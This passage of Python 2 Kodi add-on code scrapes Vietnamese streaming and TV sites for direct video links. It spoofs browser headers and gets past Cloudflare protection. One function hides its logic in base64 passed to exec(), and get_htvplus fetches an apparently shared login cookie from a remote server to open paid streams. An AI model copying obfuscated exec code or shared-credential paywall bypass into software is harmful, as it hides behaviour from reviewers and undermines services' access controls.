		video_url = Jstr['default_episode']['play_info']['data']['hls_link_play']
		
	return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=https://www.thvli.vn'
def getVTCnow(url):
	r = urlfetch.fetch(url)
	if '/kenh/' in url:
		match = re.search(r"src: \"(.+?)\"",r.body)
	else:
		match = re.search(r"src: '(.+?)'",r.body)
	video_url = match.group(1)
	
	return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=https://vtcnow.vn/'
		
def getHsex(url):
	r = urlfetch.get(url)
	regex = r"content=”(.+?)”"
	match = re.search(regex,r.body)
	video_url = match.group(1)
	return video_url


def getVTV16(url):
	r = urlfetch.get(url)
	regex = r"var urlPlay = \'(.+?)\'"
	match = re.search(regex,r.body)
	if match:
		urlPlay = match.group(1)
		
	else:
		urlPlay = ''
	regex = r"src=\"(.+?)\"></iframe>"
	matches = re.search(regex,r.body)
	geturl = matches.group(1)

	if 'fembed.com' in geturl:
		match = re.search(r"v\/(.+)",geturl)
		id_film = match.group(1)
		api_url = 'http://www.fembed.com/api/sources/'+id_film
		response = urlfetch.post(api_url)
		jStr = json.loads(response.body)
		t = len(jStr['data'])
		video_url = jStr['data'][(t-1)]['file']
		return(video_url)
	else:
		geturl = urlPlay
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Cookie': cloudfare(geturl)
			}
		r = urlfetch.get(geturl, headers=headers, max_redirects=10)
		if r.status == 404:
			notify('Không lấy được link. Lỗi website.')
			return
		else:
			regex = r"\"file\":\"(.+?)\""
			matches = re.finditer(regex, r.body)
			video_url = []
			for matchNum, match in enumerate(matches):
				matchNum = matchNum + 1
				for groupNum in range(0, len(match.groups())):
					groupNum = groupNum + 1
					match = match.group(groupNum)
					video_url.append(match)
			t = len(video_url)
			return((video_url[(t-1)]))
        



def getseetiptv(url):
	headers = {
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Referer': 'http://sweetiptv.com/live/',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
	}
	response = urlfetch.get(url,headers=headers)
	regex = r"stream\":\s\"(.+?)\""
	match = re.search(regex,response.body)
	video_url = match.group(1)
	#Get param
	regex = r"wmsAuthSign=(.+)"
	matches = re.search(regex, video_url)
	wmsAuthSign=matches.group(1)
	regex = r"(http.+)\?"
	matches = re.search(regex, video_url)
	video_url = matches.group(1)
	video_url = video_url.replace(' ','%20')
	match = re.search(r"(http.+\/)",video_url)
	_video_url=match.group(1)
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
		'Referer': video_url,
		'Origin': 'http://sweetiptv.com',
	}
	params = {'wmsAuthSign': wmsAuthSign}
	r = urlfetch.get(video_url, headers=headers, params=params)
	match = re.search(r"(chunk.+)",r.body)
	string = match.group(1)
	video_url = _video_url+string
	return(video_url)
def getGoogleDrive(url):
	matches = re.search(r"d\/(.+?)\/", url)
	if matches:
		google_id = matches.group(1)
		url = "https://drive.google.com/uc?export=download&id=%s" % google_id
		url1 = 'https://drive.google.com/uc?authuser=0&id=%s&export=download' % google_id
	headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br"}
	
	try:
		r = urlfetch.get(url,headers=headers)
		cookie = r.cookiestring
		regex = r"id=\"uc-download-link\".+?href=\"(.+?)\""
		match = re.search(regex,r.body)
		url = match.group(1)
		video_url = "https://drive.google.com"+url
		video_url = video_url.replace('amp;','')
		headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br",'cookie':cookie}
		r = urlfetch.get(video_url,headers=headers)
		if r.status == 302:
			link = r.getheader('location')
			xbmc.log(link)
			return link
		else:
			notify('Quá giới hạn play hôm nay')
	except:
		xbmc.log(url)
		return url1
	
def getOpenloadLink(url):
	regex = r"https://openload.co.+\/(.{11})\/"
	match = re.search(regex,url)
	movie_id = match.group(1)
	api_url = 'https://api.openload.co/1/streaming/get?file=' + movie_id
	try:
		r = fetch_data(api_url)
		jStr = json.loads(r.body)
		
	except:
		notify('Error. Try later')
	if jStr.get("status",0) == 200:
		video_url = jStr.get('result',{}).get('url','')
		return video_url
	elif jStr.get("status",0) == 403:
		alert('Hãy vào trang [COLOR yellow]https://olpair.com/[/COLOR] để pairing thiết bị của bạn và thử lại.')
		
	
	
def getPhimMedia(url):
	try:
		r = urlfetch.get(url)
		match = re.search(r"sources: (\[[^\[]+?\])",r.body)
		if match:
			match = match.group(1)
			t = (match.count('file'))
			matches = re.findall(r"file: \"(.+?)\"", match)
			video_url = matches[(t-2)]
		else:
			video_url = 'thongbao2'
	except Exception as e:
		notify('Link hỏng')
		pass
	return video_url
	
def getPhimNhanh(url):
	alert("Không có")
	return 
def getTEST(url):
	video_url = ''
	return video_url


def getvtvgo(url):
	url = url.lower()
	response = urlfetch.get(url)
	regex = r"var link = '(.*m3u8)'"
	match = re.search(regex,response.body)
	link = match.group(1)
	
	

def getaW1wb3J0IHV(url):
	exec(fuck('aW1wb3J0IHVud2lzZQp1cmwgPSB1cmwucmVwbGFjZSgnYVcxd2IzSjBJSFYnLCdodHRwOi8vd3d3LnBoaW1tb2kubmV0JykKciA9IHVybGZldGNoLmdldCh1cmwpCl94XyA9IHVud2lzZS51bndpc2VfcHJvY2VzcyhyLmJvZHkpCm1hdGNoID0gcmUuc2VhcmNoKHIic3JjPVwiKC4qZXBpc29kZWluZm8uKz8pXCIiLF94XykKZ2V0X3VybCA9IG1hdGNoLmdyb3VwKDEpCmdldF91cmwgPSBnZXRfdXJsLnJlcGxhY2UoJ2phdmFzY3JpcHQnLCdqc29uJykKcj11cmxmZXRjaC5nZXQoZ2V0X3VybCkKc3RyPWpzb24ubG9hZHMoci5ib2R5KQp2aWRlb191cmwgPSBzdHJbJ21lZGlhcyddWzBdWyd1cmwnXQp2aWRlb191cmwxID0gc3RyWydlbWJlZFVybHMnXVswXQ=='))
	
	try:
		r  = urlfetch.get(video_url)
		if r.status == 200:
			notify('Thành công')
			return video_url
		else:
			notify('Try to get link')
			if 'openload' in video_url1:
				return getOpenloadLink(video_url1)
			else:
				return PlayToKodi(url)
	except:
		notify('Lỗi website, không lấy được link')
	
	
	
def getAphim(url):
	if 'get_file' in url:
		import urllib
		url = urllib.unquote_plus(url)
		matches = re.search(r"movie_id=(.+?)&episode_id=(.+?)&", url)
		movie_id = matches.group(1)
		episodes_id = matches.group(2)
		matches = re.search(r"slug=(.+)", url)
		slug = matches.group(1)
		url1 = 'https://aphim.co/phim/'+slug
		
		headers = { 'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
			'Host'				: 'aphim.co',
			'X-Requested-With'	:  'XMLHttpRequest',
			'Referer'			: url1
			}
		
		response = urlfetch.get(url, headers=headers)
		jsonStr = json.loads(response.body)
		video_url = jsonStr['file']
	else:
		response = urlfetch.get(url)
		match = re.search(r"value=\"(.+?)\" id=\"_movie_id\">", response.body)
		movie_id = match.group(1)
		match = re.search(r"data-movie-id=\"(.+?)\"", response.body)
		episode_id = match.group(1)
		headers = { 'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
					'Host'				: 'aphim.co',
					'X-Requested-With'	:  'XMLHttpRequest',
					'Referer'			: url
					}
		try:
			request_url = 'https://aphim.co/load-film-header'
			data = {'movie_id': movie_id, 'episode_id': episode_id}
			response = urlfetch.post(request_url, headers=headers, data=data)
			jsonStr =json.loads(response.body)
			video_url = jsonStr['list_source_single'][0][0]['file']
		except Exception as e:
			notify('Link bị hỏng hoặc code web thay đổi')
			pass
	
	return video_url

'''	
def GoogleDrive(url):
	response = urlfetch.get(url)
	if response.status == 302:
		t = response.getheader('set-cookie')
		link = response.getheader('location')
		video_url = link+'|'+'Cookie='+t
	else:
		video_url = 'thongbao4-Video het luot xem. Xin vui long quay lai sau.'
	return video_url
'''
def PlayToKodi(url):
	
	if 'ok.ru' in url:
		return getOkru(url)
	else:
		try:
			video_url = 'plugin://plugin.video.sendtokodi/?'+url
			return video_url
		except:
			notify('Không lấy được link')
			pass
	
	
		
	
	
def getHdsieunhanh(url):
	
	if 'Tap' in url:
		match = re.search(re.compile(r"Tap-(\d+)"), url)
		tapid = match.group(1)
	else:
		tapid = ''
	if '/show-' in url:
			show = 'show'
	else:
			show = ''
	match = re.search(re.compile(r"-(\d+)\.html"), url)
	pid = match.group(1)
	#print (pid)
	response = urlfetch.get(url)
	cookie = response.cookiestring;

	response = urlfetch.get('http://ip.hdsieunhanh.com/')
	match = re.search(re.compile(r"'(.*?)'"), response.body)
	yourip = match.group(1)
	print (yourip)
	headers = {'Host': 'www.hdsieunhanh.com', 'Accept-Encoding': 'gzip, deflate, compress, identity, *', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Cookie': cookie, 'Referer': url, 'X-Requested-With'	: 'XMLHttpRequest'}
	data = {'ip': yourip}

	attempt = 1
	MAX_ATTEMPTS = 3

	try:
		response = urlfetch.get('http://www.hdsieunhanh.com/getsource'+show+'/' +pid +'_'+tapid +'?ip=' +yourip, headers=headers, data=data)
		json_data = json.loads(response.body)
		video_url = json_data['sources'][0]['file']
		phude = json_data['tracks'][2]['file']
		return (video_url+'[]'+phude)
	except Exception as e:
		print e
		pass
			

def getMp3Zing(url):
	headers = { 'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
			'Host'				: 'mp3.zing.vn',
			'Referer'			: url,
			'X-Requested-With'	: 'XMLHttpRequest'
			}
					
	s = requests.Session()
	r = s.get(url, headers=headers)
	matches = re.search(r"data-xml=\"(.+?)\"", r.content)
	url_get = matches.group(1)
	url_get = 'http://mp3.zing.vn'+url_get
	r = s.get(url_get, headers=headers)
	json_data = json.loads(r.content)
	mp3link = json_data["data"][0]["source_list"][0]		
	return mp3link
	
def getAnime47(url):
	headers = {
			'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
			'Referer': 'http://anime47.com',
			'Cookie'			: 'location.href=1; path=/'}
	url_data = urlfetch.get(url, headers=headers)
	matches = re.search(r"var _\w+\W+(\[.+?\])", url_data.body)
	keys = matches.group(1)
	keys = keys.decode('string_escape')
	keys = json.loads(keys)[5].encode('utf-8')
	matches = re.search(r'link:\s\"(.*?)\"', url_data.body)
	google_link = matches.group(1)
	player_url = 'http://anime47.com/player/player.php'
	data = {'link': google_link}
	response = urlfetch.post(player_url, headers=headers, data=data)
	j = response.body.decode('base64')
	jsonStr = json.loads(j)
	s = jsonStr['s']
	salt  = s.decode("hex")
	ct = jsonStr['ct']
	l = vmf.decode(ct, keys, salt)
	links = json.loads(l)
	matches = re.search(r"\"file\":\"(.*?)\"", links)
	if matches:
		links = matches.group(1)
	else:
		return 'thongbao2'
	return (links)
		

	
def getTQV(url):
	if 'get' in url:
		r = requests.get(url)
		url = r.url
		
	else:	
		matches = re.search(r"channel=(.+)", url)
		channel = matches.group(1)
		response = urlfetch.get(url)
		matches = re.search(r"source src=\"(.+?)\"", response.body)
		url = matches.group(1)
	return url
def getKphim(url):
	matches = re.search(r"\?vid=(\d+)\?sid=(\d+)", url)
	vid = matches.group(1)
	sid = matches.group(2)
	token=urllib2.hashlib.md5(vid+'func'+sid).hexdigest()[1:]
	getlink = 'http://kphim.tv/embed/'+vid+'/'+sid+'/'+token
	response = urlfetch.get(getlink)
	matches = re.search(r"file:\s'(.+?)'", response.body)
	video_url = matches.group(1)
	response = urlfetch.get(video_url)
	rh = response.getheaders()
	video_url = rh[5][1]
	return video_url

def getmp3zing(url):	
	response = urlfetch.get(url)
	matches = re.search(r"data-xml=\"(.+?)\"", response.body)
	url_get= matches.group(1)
	if 'http' not in url_get:
		url_get = 'http://mp3.zing.vn'+url_get
	#lấy link nhạc
	response = urlfetch.get(url_get)
	json_data = json.loads(response.body)
	data = json_data["data"][0]["source_list"][1]
	if len(data) == 0:
		data = json_data["data"][0]["source_list"][0]
	return data
	
def getHayhayTV(url):
	response = urlfetch.get('http://ip.hayhaytv.vn/')
	cookie = response.cookiestring;
	matches = re.search(r"userip = '(.+?)'", response.body)
	yourip = matches.group(1)
	response = urlfetch.get(url)
	matches = re.search(r"FILM_KEY = '(.+?)'", response.body)
	id_url = matches.group(1)
	get_url = 'http://www.hayhaytv.vn/getsource/'+id_url+'__?ip='+yourip
	headers = {
			'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
			'Referer': url,
			'Host'	: 'www.hayhaytv.vn',
			'Cookie'			: cookie}
	if "show" in url:
		get_url = get_url.replace("getsource", "getsourceshow")
	
	attempt = 1
	MAX_ATTEMPTS = 3
	
	while attempt < MAX_ATTEMPTS:
		if attempt > 1: 
			sleep(2)
		notify (u'Lấy link lần thứ #%s'.encode("utf-8") % attempt)
		response = urlfetch.get(get_url, headers=headers)
		if not response:
			return 'thongbao2'
					
		matches = re.search(r"(\{\"sources.+)", response.body)
		if matches:
			break
	t = matches.group(1)
	json_data = json.loads(t)
	video_url = json_data["sources"][1]["file"]
	if 'youtube.com' in video_url:
		matches = re.search(r"v=(.+)", video_url)
		id_youtube = matches.group(1)
		video_url = "plugin://plugin.video.youtube/?path=/root/video&action=play_video&videoid=" + id_youtube 
	phude = json_data["tracks"][0]["file"]
	if len(phude) > 0:
		return video_url+"[]"+phude
	else:
		return video_url

def xemphimso(url):
	response = urlfetch.get(url)
	match = re.search(r"<script type=\"text\/javascript\" src=\"(https://grab.+?)\"", response.body)
	grablink = match.group(1)
	attempt = 1
	MAX_ATTEMPTS = 2
	while attempt < MAX_ATTEMPTS:
		if attempt > 1: 
			print('p')
		notify (u'Lấy link lần thứ #%s'.encode("utf-8") % attempt)
		attempt += 1
		grablink = grablink+'&reload=%s' % attempt
		response = urlfetch.get(grablink)
		match = re.search(r"jwConfigPlayer.playlist\[0]\.sources =(.+?);", response.body)
		if match:
			video_url = match.group(1)
			jStr = json.loads(video_url)
			video_url = jStr[0]['file']
		
	return video_url
	


def getHaivn(url):
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
			'Referer'  : url
		}
	response = urlfetch.get(url, headers=headers)
	if not response:
		notify(u'Trang nguồn có lỗi. Thông báo cho dev.'.encode("utf-8"))

	if 'youtube-player' in response.body:
		
		matches = re.search(r"iframe allowfullscreen=\"true\" src=\"(.+?)\?", response.body)
		
		video_url = matches.group(1)
		matches = re.search(r"embed\/(.+)", video_url)
		youtube_id = matches.group(1)
		video_url = "plugin://plugin.video.youtube/?path=/root/video&action=play_video&videoid=" + youtube_id
		
	else:
		regex = r'script type=\"text\/javascript\" src=\"(.+?mecloud-player)\"'
		matches = re.search(regex, response.body)
		if not matches:
			return ''
		url_player = matches.group(1)
		
		response = urlfetch.get(url_player, headers=headers)
		regex = r"\"video\":(\[.+?\])"
		matches = re.search(regex, response.body)
		video_url = matches.group(1)
		t = video_url.count('url')
		data = json.loads(video_url)
		video_url = data[t-1]['url']
		video_url = 'http:'+video_url
	
	return video_url
	xbmc.log(video_url)
		
def get_hdonline(url):
	attempt = 1
	MAX_ATTEMPTS = 5
	
	while attempt < MAX_ATTEMPTS:
		if attempt > 1: 
			sleep(2)
		url_play = ''
		notify (u'Lấy link lần thứ #%s'.encode("utf-8") % attempt)
		attempt += 1
		headers = { 
				'User-Agent' 	: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
				'Referer'		: 'http://hdonline.vn'
			}
		response = fetch_data(url, headers)
		if not response:
			return ''

		cookie = response.cookiestring

		match = re.search(r'eval\(function\((.*?)split\(\'\|\'\),0,\{\}\)\)', response.body)
		if match:
			eval_js = 'eval(function(' + match.group(1) + 'split(\'|\'),0,{}))'
			
			response = fetch_data('http://vietmediaf.net:4000/api/v1/decode/hdo', None, {'data': eval_js})

			json_data = json.loads(response.body)
			_x = random.random()
			url_play = ('http://hdonline.vn%s&format=json&_x=%s' % (json_data['playlist'][0]['file'], _x))
			
			#tim ep
			
			match = re.search(r'\-tap-(\d+)-[\d.]+?\.html$', url)
			if match:
				ep = match.group(1)
				url_play = url_play.replace('ep=1','ep='+ep)
			
			break
		else:
			match = re.search(r'\-tap-(\d+)-[\d.]+?\.html$', url)
			if not match:
				ep = 1
			else:
				ep = match.group(1)
			match = re.search(r'"file":"(.*?)","', response.body)
			if match:
				url_play = 'http://hdonline.vn' + match.group(1).replace('\/','/') + '&format=json&reloadbk=1'
				url_play = url_play.replace('ep=1','ep=' + str(ep))
				break
	if len(url_play) == 0:
		notify (u'Không lấy được link.')
		return ''

	headers = { 
				'User-Agent' 	: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
				'Referer'		: 'http://hdonline.vn',
				'Accept'		: 'json',
				'Cookie'		: cookie
			}
	
	
	response = fetch_data(url_play, headers)

	json_data = json.loads(response.body)
	video_url = json_data['file']
	if json_data.get('level') and len(json_data['level']) > 0:
		video_url = json_data['level'][len(json_data['level']) - 1]['file']

	subtitle_url = ''
	if json_data.get('subtitle') and len(json_data['subtitle']) > 0:
		for subtitle in json_data['subtitle']:
			subtitle_url = subtitle['file']
			if subtitle['code'] == 'vi':
				subtitle_url = subtitle['file']
				break
	if len(subtitle_url) > 0:		
		#subtitle_url = ('http://data.hdonline.vn/api/vsub.php?url=%s' % subtitle_url)
		subtitle_url = subtitle_url.replace('http://data.hdonline.vn//', 'http://data.hdonline.vn/')
		xbmc.log('HDONLINE')
		xbmc.log(subtitle_url)
		return video_url + "[]" + subtitle_url
	else:
		return video_url
def getVtv(url)	:
	response = urlfetch.get(url)
	matches = re.search(r"src=\"(.+play.+?)\"", response.body)
	play_url = matches.group(1)
	headers = {'Host': 'play.sohatv.vn', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Referer': url}
	response = urlfetch.get(play_url, headers=headers)
	matches = re.search(r"status-code=200 src=\"(.+?)\"", response.body)
	url_play = matches.group(1)
	matches = re.search(r"live=(.+?m3u8)", url_play)
	m3u8 = matches.group(1)
	m3u8 = 'http:'+urllib.unquote_plus(m3u8)
	split_list = m3u8.split('/', 9)
	remove = split_list[8]
	vtvvn_option = 'true'
	if 'vtv5-tay-nam-bo' not in url:
		matches = re.search(r"==(.+?)\.", remove)
		remove = matches.group(1)
		if vtvvn_option == 'false':
			m3u8 = m3u8.replace(remove, '_m')
		if vtvvn_option == 'true':
			m3u8 = m3u8.replace(remove, '')
	else:
		print('Kenh vtv5 nam bo')
		if vtvvn_option == 'false':
			m3u8 = m3u8.replace(remove, 'dnR2NWtt_m.m3u8')
		if vtvvn_option == 'true':
			m3u8 = m3u8.replace(remove, 'dnR2NWtt.m3u8')
	return m3u8

	
def getTvnet(url):
	headers = {'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Origin': 'http://vn.tvnet.gov.vn', 'Referer': url}
	r = urlfetch.get(url, headers=headers)
	matches = re.search(r"data-file=\"(.+?)\"", r.body)
	url_get = matches.group(1)
	url_get = url_get.replace('amp;', '')
	r = urlfetch.get(url_get, headers=headers)
	json_data = json.loads(r.body)
	video_url = json_data[0]["url"]
	return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=http://vn.tvnet.gov.vn'

		
def getAcestream(url):
	if 'plugin:' in url:
		ace_link = url
	else:
		ace_option = ADDON.getSetting('ace')
		if ace_option == 'true':
			ace_link = 'plugin://program.plexus/?mode=1&url='+url+'&name=Video'
		else:
			response = fetch_data('http://127.0.0.1:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback')
			if not response:
				alert('Vui lòng khởi động ứng dụng Acestream. Cài đặt tại [COLOR yellow]acestream.org[/COLOR]')
				return
			else:
				ace_link = url.replace("acestream://", "http://localhost:6878/ace/getstream?id=")
				
	return ace_link		

def getSopcast(url):
	if 'plugin:' in url:
		sopcast_link = url
	else:
		sopcast_link = 'plugin://program.plexus/?mode=2&url='+url+'&name=Video'
	return sopcast_link
		
def get_fptplay(url):
	import requests
	match = re.search(r'\-([\w]+)\.html', url)
	movie_id = match.group(1)
	match = re.search(r'#tap-([\d]+)$', url)
	if match:
		episode_id = match.group(1)
	else:
		episode_id = 1

	s = requests.Session()
	r = s.get('https://fptplay.net')
	headers = {
		'origin': 'https://fptplay.vn',
		'x-key': '123456',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'accept': 'application/json, text/javascript, */*; q=0.01',
		'referer': url,
		'authority': 'fptplay.vn',
		'x-requested-with': 'XMLHttpRequest',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
	}

	data = {
	  'id': movie_id,
	  'type': 'newchannel',
	  'quality': '3',
	  'episode': episode_id,
	  'mobile': 'web'
	}

	r = s.post('https://fptplay.vn/show/getlink', headers=headers, data=data)
	json_data = json.loads(r.content)
	video_url=json.loads(r.content)['stream']
	return video_url+'|User-Agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36&Referer=https://fptplay.vn' 

def get_vtvgo(url):
	import requests
	if not 'https' in url:
		url = url.replace('http','https')
	headers = {
		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" ,
		"Accept-Encoding" : "gzip, deflate" ,
		"Referer" : url ,
		"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8" ,
		"Origin" : "https://vtvgo.vn" ,
		"X-Requested-With" : "XMLHttpRequest"
	}
	r = requests . Session ( )
	r . headers . update ( headers )
	content = r . get ( url )
	content = content . text . encode ( "utf8" )
	regex = r"var token = '(.+?)'"
	match = re.search(regex,content)
	token = match.group(1)
	print(token)
	match = re.search(r"var time = '(.+?)'",content)
	time = match.group(1)
	print(time)
	match = re.search(r"-(\d+)\.html",url)
	id_channel = match.group(1)
	data = {
		"type_id" : "1" ,
			"id" : id_channel,
			"time" : time,
			"token" : token
	}
	r = r.post("https://vtvgo.vn/ajax-get-stream",data = data,verify = False)
	match = re.search(r"(https.+?m3u8)",r.content)
	video_url = match.group(1)
	video_url = video_url.replace("\/","/")
	
	return (video_url+"|'User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F56.0.2924.87%20Safari%2F537.36& Referer=http%3A%2F%2Fvtvgo.vn%2F")

def get_htvonline(url):
	response = fetch_data(url)
	cookie=response.cookiestring;
	if not response:
		return ''
	match = re.search(re.compile(r'data-source=\"(.*?)\"'), response.body)
	if not match:
		return 'thongbao2'
	video_url = match.group(1)
	video_url = video_url.replace('playlist', 'chunklist')
	return(video_url+'|Referer=http%3A%2F%2Fhplus.com.vn&User-Agent=Mozilla%2f5.0+(Windows+NT+10.0%3b+WOW64%3b+rv%3a48.0)+Gecko%2f20100101+Firefox%2f48.0')
	
	
def get_thvl(url):
	cookie = urlfetch.get('http://thvl.vn/').cookiestring;
	headers = {'Host': 'thvl.vn', 'Accept-Encoding': 'gzip, deflate, compress, identity, *', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Cookie': cookie, 'Referer': 'http://thvl.vn/jwplayer/?l=rtmp&i=http://thvl.vn/wp-content/uploads/2014/12/THVL1Online.jpg&w=640&h=360&a=0', 'X-Requested-With'	: 'XMLHttpRequest'}
	data = {'l': 'rtmp', 'i': 'http://thvl.vn/wp-content/uploads/2014/12/THVL1Online.jpg', 'w': '640', 'h': '360', 'a': '1'}
	response = urlfetch.get(url, data=data, headers=headers)
	return re.search(r'file:\s"(.*?)"', response.body).group(1)

def get_tvmienphi(url):
	cookie = urlfetch.get('http://www.tvmienphi.biz').cookiestring;
	headers = {'Host': 'link.tvmienphi.biz', 'Accept-Encoding': 'gzip, deflate, compress, identity, *', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Cookie': cookie, 'Referer': 'http://mi.tvmienphi.biz/'}
	return re.search(r'channel_stream\s=\s\"(.*?)\"', urlfetch.get(url, headers=headers).body).group(1)


def get_htvplus(url):
	if len(USER_VIP_CODE) > 0:
		try:
			f='U2FsdGVkX1+RQXkDAFegicGii3RLBVGrsbMVRV+kHpUpTExURcDQLDLLDkxsGOTf'
			#notify(u'VMF Getlink system'.encode("utf-8"))
			response = fetch_data(VIETMEDIA_HOST + vmf.gibberishAES(f, 'vmf'))
			json_data = json.loads(response.body)
			t =json_data['username'].decode("base64")
			headers = { 
					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
					'Referer'			: url,
					'Cookie'		: t
					}
			response = urlfetch.get(url, headers=headers)
			regex = r"iosUrl = \"(.+?)\""	
			matches = re.search(regex, response.body)
			video_url = matches.group(1)
			
			get_url = 'http://hplus.com.vn/content/getlinkvideo/'
			headers = { 
					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
					'Referer'			: url,
					'Host'		: 'hplus.com.vn',
					'X-Requested-With': 'XMLHttpRequest',
					'Cookie'		: t			
					}
			data = {'url': video_url, 'type': '1', 'is_mobile': '0'}
			response = urlfetch.post(get_url, headers=headers, data=data)
			video_url = response.body.encode("utf-8")
			refer = "|User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F58.0.3029.110%20Safari%2F537.36&Referer=http%3A%2F%2Fhplus.com.vn%2F"
			return (video_url + refer)
			
		except Exception as e:
			notify('Khong lay duoc link')
			pass
	else:
		headers = { 
					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
					'Referer'			: url,
					'Cookie'		: t
					}
		response = urlfetch.get(url, headers=headers)
		t = response.cookiestring;
		regex = r"iosUrl = \"(.+?)\""	
		matches = re.search(regex, response.body)
		video_url = matches.group(1)
		get_url = 'http://hplus.com.vn/content/getlinkvideo/'
		headers = { 
				'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
				'Referer'			: url,
				'Cookie'		: t			
				}
		data = {'url': video_url, 'type': '1', 'is_mobile': '0'}
		response = urlfetch.post(get_url, headers=headers, data=data)
		video_url = response.body.encode("utf-8")
		refer = "|User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F58.0.3029.110%20Safari%2F537.36&Referer=http%3A%2F%2Fhplus.com.vn%2F"
		return (video_url + refer)
		
def get_hash(m):
	md5 = m or 9
	s = ''
	code = 'LinksVIP.Net2014eCrVtByNgMfSvDhFjGiHoJpKlLiEuRyTtYtUbInOj9u4y81r5o26q4a0v'
	for x in range(0, md5):
		s = s + code[random.randint(0,len(code)-1)] 
    
	return s
def convert_ipv4_url(url):
	host = re.search('//(.+?)(/|\:)', url).group(1)
	addrs = socket.getaddrinfo(host,443)
	ipv4_addrs = [addr[4][0] for addr in addrs if addr[0] == socket.AF_INET]
	url = url.replace(host, ipv4_addrs[0])
	return url
def checkAccFshare():
	if len(ADDON.getSetting('fshare_username')) == 0 or len(ADDON.getSetting('fshare_password')) == 0:
		alert(u'Bạn chưa nhập [COLOR red]tài khoản cá nhân Fshare[/COLOR]'.encode("utf-8"))
